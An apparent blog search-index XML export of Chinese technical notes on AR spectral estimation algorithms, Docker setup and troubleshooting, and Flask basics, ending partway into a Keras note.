<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AR模型谱估计的几种算法比较</title>
    <url>/fcd4/</url>
    <content><![CDATA[<p>Burg法,L-D法等 <a id="more"></a> ### AR（自回归）模型</p>
<p>AR模型适用于平稳、宽平稳的随机序列，是一个差分方程模型。 可以认为是一个带微扰的马尔可夫过程。一个最简单的例子是<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3VwZXItemhhbmctODI4L3AvNzEwNjk3MC5odG1s">单摆<i class="fa fa-external-link-alt"></i></span>。一些不满足平稳条件的事件，AR模型的分析效果是很差的（如股票预测）</p>
<p>从时域讨论稳定参见<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNTA5MzgzNQ==">时间序列的自回归模型—从线性代数的角度来看<i class="fa fa-external-link-alt"></i></span>, 当Y-W方程的系数矩阵正定时，传递函数的极点在单位圆内，模型稳定。</p>
<h3 id="ar模型及功率谱的估计">AR模型及功率谱的估计</h3>
<p>主要有前向预测的L-D法，Burg法，Marple法，矩阵分解等算法，此外还有极大似然估计等估计方法。 Burg算法和Marple算法都是求前向预测和后向预测误差之和最小，Burg算法较为常用。Marple算法很容易受噪声影响导致不稳定。</p>
<p>Burg算法对于高斯随机过程等价于最大熵算法</p>
<p>AR功率谱估计可以突破较短序列由于序列长度N过短对于频率分辨率的限制。经典谱估计的频率分辨率约为</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex" xmlns="http://www.w3.org/2000/svg" width="9.447ex" height="4.676ex" role="img" focusable="false" viewBox="0 -1381 4175.6 2067"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mi" transform="translate(833, 0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(1660.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2716.6, 0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 676)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mi" transform="translate(550, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mi" transform="translate(285.5, -686)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><rect width="1219" height="60" x="120" y="220"></rect></g></g></g></g></svg></mjx-container></span></p>
<p>AR法通过前向和后向预测外推，突破了短序列长度N的限制（N点长序列相当于长序列加窗，频率分辨率受限于主瓣宽度）。但是AR法仍然无法突破奈奎斯特采样定理<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="2.626ex" height="3.006ex" role="img" focusable="false" viewBox="0 -983.5 1160.5 1328.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 485) scale(0.707)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mi" transform="translate(550, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mn" transform="translate(403.5, -345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="920.5" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span>的限制。要想突破采样定理，只有在特定的条件下采用<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yMjQ0NTMwMg==">压缩感知<i class="fa fa-external-link-alt"></i></span>等方法改变采样方式，如磁共振重建。</p>
<p>几种功率谱估计的比较</p>
<ol type="1">
<li>算法复杂度 L-D 算法计算量约为直接解Y-W方程的一半 Marple算法复杂，计算量大</li>
<li>效果 L-D算法<br>
1)一定收敛 2误差较大； 3)预测均方随阶数增加而减小 4)可能出现谱线分裂 5)受阶数影响大，阶数过高有伪峰。 Burg算法<br>
1)在有限长情况下好于前向预测 2)对于高斯随机信号，AR谱估计和最大熵算法效果相同 3)易受初相的影响产生频率偏移 Marple算法<br>
1)通常性能最好，分辨率最高 2)可能会不稳定 3)基本上克服了谱线分裂、频率偏移和出现伪峰等缺点</li>
</ol>
<h3 id="函数包">函数包</h3>
<p>这些算法基本都有成熟的工具包 比如matlab中：</p>
<ol type="1">
<li>pyulear.m 用AR模型的自相关法估计信号的功率谱，其基本调用格式是： [Px, F] = pyulear(x, order, Nfft, Fs)</li>
<li>pburg.m 用AR模型的Burg算法估计信号的功率谱，调用格式与pyulear类似</li>
<li>pcov.m 用AR模型方差方法估计信号的功率谱</li>
<li>pmcov.m 用AR模型的改进的方差方法估计信号的功率谱</li>
<li>pmem.m 最大熵功率谱估计，其估计性能类似pyulear</li>
<li>pmusic.m 用自相关矩阵分解的MUSIC算法估计信号的功率谱</li>
<li>peig.m 用自相关矩阵分解的特征向量 法估计信号的功率谱，其基本调用格式是： [Px, F] = peig(x, order, Nfft, Fs), [Px, F，V, E] = peig(x, order, Nfft, Fs), x :信号向量，order:模型的阶次，Fs:抽样频率，Nfft:对x作FFT时的长度。Px:估计出的功率谱，F是频率轴坐标。对peig, 输出的E 是由自相关矩阵的特征值所组成的向量，V是由特征向量组成的矩阵。V的列向量张成了噪声子空间，V的行数减去列数即是信号子空间的维数。</li>
<li>直接得到模型有aryulear、arburg等函数，用法： arburg(x,order)</li>
</ol>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>DSP</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker笔记</title>
    <url>/69d4/</url>
    <content><![CDATA[<p>开始折腾Docker，等待填坑 <a id="more"></a> 容器化到底拿来干什么呢</p>
<p>Docker还可以套娃，Docker里面跑Docker</p>
<h2 id="基本设置和操作">基本设置和操作</h2>
<h3 id="docker设置">Docker设置</h3>
<p>一定要先启动, 不然有可能<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> docker start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用<code>docker exec -it XXXXXX bash</code>进入容器的命令界面，输入exit退出</p>
<p>同步Docker容器和宿主机的时间：<code>docker cp /etc/localtime &lt;container id&gt;:/etc/localtime</code></p>
<p>加当前用户到用户组里面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="离线装docker镜像">离线装Docker镜像</h4>
<p>教研室服务器的网一直出问题，还有一台机子没有外网 决定离线搞Docker镜像 发现Docker有离线的方法，就是直接在别的机子上pull，然后</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker save -o mysql.tar mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把生成的tar文件拷到服务器上</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker load -i  mysql.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="docker-compose-部署">Docker Compose 部署</h3>
<p>当部署多个Docker容器，它们之间还有关联的时候，就用Compose代替Docker run，比如师兄Flask写的标注工具，就是前后端分别一个Docker容器</p>
<p>运行：<code>docker-compose up</code>自动创建</p>
<h3 id="docker镜像">Docker镜像</h3>
<p>Docker镜像（image）也是一堆文件，可以自己建或者从远程pull别人建好的 有了Docker镜像，再写好Dockerfile就可以跑起来了（跑起来之后就是个容器container）</p>
<h3 id="dockerfile">Dockerfile</h3>
<p>语法近似bash脚本，填写好之后启动会根据文件里面的配置逐步执行</p>
<h2 id="常用命令">常用命令</h2>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Docker build</td>
<td>创建镜像</td>
</tr>
<tr class="even">
<td>Docker create</td>
<td>创建镜像（并不启动）</td>
</tr>
<tr class="odd">
<td>Docker exec</td>
<td>在Docker里面执行命令</td>
</tr>
<tr class="even">
<td>Docker images</td>
<td>查看镜像</td>
</tr>
<tr class="odd">
<td>Docker pull/push</td>
<td>下载/上传镜像</td>
</tr>
<tr class="even">
<td>Docker rm/rmi</td>
<td>删除容器/镜像</td>
</tr>
<tr class="odd">
<td>Docker export/import</td>
<td>导出导入容器</td>
</tr>
<tr class="even">
<td>Docker import/load</td>
<td>导出导入镜像</td>
</tr>
<tr class="odd">
<td>Docker start/stop/restart/pause/unpause/kill</td>
<td>略</td>
</tr>
</tbody>
</table>
<h2 id="踩坑记录">踩坑记录</h2>
<p>各位看官散了吧，都是一堆弱智操作搞的</p>
<h3 id="一次弱智的踩坑">一次弱智的踩坑</h3>
<p><code>Failed to enable unit: Unit file /etc/systemd/system/docker.service is masked.</code></p>
<p>执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl unmask docker.service
systemctl unmask docker.socket
systemctl start docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>出现 <code>Job for docker.service failed because the control process exited with error code. See "systemctl status docker.service" and "journalctl -xe" for details.</code></p>
<p>出现<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p>
<p>出现<code>systemd[1]: Failed to start LSB: Create lightweight, portable, self-sufficie</code></p>
<p>Docker pull出现<code>Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp 34.201.196.144:443: connect: connection refused</code></p>
<p>是镜像源或者DNS的问题，参照<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">这里<i class="fa fa-external-link-alt"></i></span>改了。（阿里的和中科大的教研室的鬼畜教育网根本不稳，最后换了华为的（要注册账号））</p>
<p>出现<code>pkg_resources.DistributionNotFound: The 'docker-compose==1.8.0' distribution was not found and is required by the application</code></p>
<p>想用Docker-compose结果报了一堆python的错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Traceback (most recent call last):
  File &quot;&#x2F;usr&#x2F;bin&#x2F;docker-compose&quot;, line 5, in &lt;module&gt;
    from pkg_resources import load_entry_point
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2927, in &lt;module&gt;
    @_call_aside
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2913, in _call_aside
    f(*args, **kwargs)
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2940, in _initialize_master_working_set
    working_set &#x3D; WorkingSet._build_master()
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 635, in _build_master
    ws.require(__requires__)
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 943, in require
    needed &#x3D; self.resolve(parse_requirements(requirements))
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 829, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The &#39;docker-compose&#x3D;&#x3D;1.8.0&#39; distribution was not found and is required by the application<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到网上的解决方案说</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> backports.ssl_match_hostname --upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>结果pip3居然又报错了了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">pip is configured with locations that require TLS&#x2F;SSL, however the ssl module in Python is not available.
Collecting backports.ssl_match_hostname
  Retrying (Retry(total&#x3D;4, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;
  Retrying (Retry(total&#x3D;3, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;
  Retrying (Retry(total&#x3D;2, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;
  Retrying (Retry(total&#x3D;1, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>哇，又是SSL证书的问题</p>
<p>参照<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDU5NTQ1MjgvcGlwLWlzLWNvbmZpZ3VyZWQtd2l0aC1sb2NhdGlvbnMtdGhhdC1yZXF1aXJlLXRscy1zc2wtaG93ZXZlci10aGUtc3NsLW1vZHVsZS1pbg==">stackoverflow的解决方案<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -s

<span class="token function">apt</span> <span class="token function">install</span> libssl-dev libncurses5-dev libsqlite3-dev libreadline-dev libtk8.5 libgdm-dev libdb4o-cil-dev libpcap-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>切到<code>the folder with the Python 3.X library source code</code>，一般在<code>/usr/local/bin</code>底下的python文件夹 运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>依然不行 怀疑是SSL证书的问题，curl使用ssl也报错 但是openssl、libssl-dev都装了的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> ca-certificates<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>证书没过期</p>
<p>又运行了一下openssh居然报错connect:errno=111</p>
<p>查了一下 &gt;This has nothing to do with SSL. Connection refused means that either there is no server or the connection is blocked by firewall. In your case (before your edit) the server is also plain wrong, i.e. ":443" is no valid server name (hostname missing).</p>
<p>难道就是防火墙的问题吗？</p>
<p>查看了一下网络状态</p>
<p>没问题的工作站</p>
<pre class="line-numbers language-none"><code class="language-none">tcp        0      0 211.83.111.221:40294    211.83.111.224:443      ESTABLISHED 1825&#x2F;telnet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有问题的服务器</p>
<pre class="line-numbers language-none"><code class="language-none">tcp6       0      0 :::443                  :::*                    LISTEN      101411&#x2F;apache2
tcp6       0      0 211.83.111.224:443      211.83.111.221:40294    ESTABLISHED 101415&#x2F;apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>难道学校的ipv6又炸了？</p>
<p>试试<code>nc -l 443</code></p>
<p>emmm，被占用了</p>
<p>不对，我傻逼了，这是对外的端口啊。。。。</p>
<p>等吧</p>
<p><strong>更新</strong>是网费没了没充钱的问题...... 老蔡师兄不是校内的网连不上也是没充钱学校网管给断外网了...... 前几天那个Ubuntu Desktop的工作站最近也没钱了，但是http在终端可以用，镜像源什么的也能连，但是那个浏览器一打开就提示我登录账号。 突然意识到了不对，怀疑服务器的网也没钱了。 其实之前一直怀疑是被制裁了，但是工作站就是好的，才一直以为是SSL证书之类的问题 充钱之后，神奇的都能用了 看来是http神奇的逃脱了没钱的制裁 行吧，在这里排查了四五天，期间还重装过好几次Ubuntu Server 果然还是得充钱啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/jiaqian.png" alt="Picture" style="zoom:60%;" /></p>
<h2 id="参考">参考</h2>
<h2 id="再看docker">再看Docker</h2>
<p>被人骗入坑Docker，甚至教研室服务器上基本全是Docker跑的一个个容器，甚至MySQL都是跑在Docker上的。</p>
<p>Docker 网络那里</p>
<p>http://dockone.io/article/660 https://jimmysong.io/docker-handbook/</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask接锅记</title>
    <url>/ff2b/</url>
    <content><![CDATA[<p>动态语言一时爽，维护重构火葬场 <a id="more"></a> ## 前言</p>
<p>国庆假期之后开始了偶滴搬砖生活，教研室有个师兄在拿Flask做微信公众号的文章推送后端。为了读祖传代码，准备折腾Flask。 据说Flask和Django差不了太多，之前Django用的很菜，也不打算拿Django或node之类的重构一边，索性就跳Flask的坑吧</p>
<h2 id="配置">配置</h2>
<p>[1] 开启Debug模式。1.0之后直接在Pycharm的Configuration里勾选开启就好了。或者</p>
<pre><code>export Flask_Debug = 1 # win系统使用set命令</code></pre>
<p>[2] 使用装饰器，在指定url或修改请求方式时常用，如</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello, World'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>指定请求方式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[3] 处理请求、文件传输和cookies等 都在flask的request库里</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[4] 数据库用SQLAlchemy可以像Django一样用python操作数据库，建表查询调用。</p>
<h2 id="蓝图">蓝图</h2>
<p>我们项目再大一些，就要拆分模块，Flask一般使用蓝图(Blueprint) 这样注册</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> yourapplication<span class="token punctuation">.</span>simple_page <span class="token keyword">import</span> simple_page

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>simple_page<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/pages'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样引用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> yourapplication<span class="token punctuation">.</span>simple_page <span class="token keyword">import</span> simple_page

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>simple_page<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也可以作为资源放置静态文件，详见官方文档</p>
<h2 id="视图和模板">视图和模板</h2>
<p>Flask的模板(template)用的Jinja2，基本都是标签的形式，和Django的模板非常像，类似这种</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">&#123;% block title %&#125;&#123;% endblock %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(我刚刚又查了一下，Django的自带模板就是基于Jinja的魔改版，应该是Django模板像Jinja2，说反了)</p>
<p>视图函数一般用来处理入站请求，我们用装饰器把函数注册为事件处理程序，大概这个样子</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">usr</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World,&#123;&#125;!'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="项目填坑">项目填坑</h2>
<p>要搞一个微信公众号推送内容，用Flask作为后端，微信接口的大坑等会再填 申请公众号，测试号之类的略过不表。（GRD腾讯真的烦啊，还要身份证号一堆乱七八糟的，开了个人号还一堆权限不给，文档也差，更新慢还经常404打不开，那个什么Telegram Channel，就是比微信高到不知哪里去了。算了，甲方有需求，那就忍了）<br />
<del>先提前祝愿微信早日倒闭</del></p>
<h2 id="其他">其他</h2>
<p>跨域请求：安装flask-cors, 设置一下就行了</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from flask_cors import CORS
···
CORS(app, supports_credentials&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在chrome的新特性中，使用Same-Site Cookies来解决CSRF跨域攻击的问题，没设置会报这种警告, 在未来的版本中，没设置是不允许跨域的</p>
<pre class="line-numbers language-none"><code class="language-none">A cookie associated with a cross-site resource at http:&#x2F;&#x2F;··· was set without the &#96;SameSite&#96; attribute. A future release of Chrome will only deliver cookies with cross-site requests if they are set with &#96;SameSite&#x3D;None&#96; and &#96;Secure&#96;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>设置一下属性就好了</p>
<p>生成和导入requirements</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pip freeze <span class="token operator">></span> requirements<span class="token punctuation">.</span>txt
pip install <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>使用哈希值存储用户密码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="flask部署">Flask部署</h2>
<p>这里我用的Docker。照着<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83ODQzMjcxOQ==">这里<i class="fa fa-external-link-alt"></i></span>部署的 这里没有用Nginx，直接上的gunicorn，回头看一下Nginx怎么搞 这里有个<span class="exturl" data-url="aHR0cDovL2RvY3MuZ3VuaWNvcm4ub3JnL2VuL3N0YWJsZS9kZXBsb3kuaHRtbA==">官方文档<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Keras笔记</title>
    <url>/d5cc/</url>
    <content><![CDATA[<p>瞎写的 <a id="more"></a> ## Keras函数式API</p>
<p>构造张量</p>
<pre><code>inputs = Input(shape=(64,))</code></pre>
<p>创建层</p>
<pre><code>dense = layers.Dense(32, activation=&#39;relu&#39;)

output_tensor = dense(input_tensor)</code></pre>
<p>输出也是一个张量</p>
<h2 id="回调函数等">回调函数等</h2>
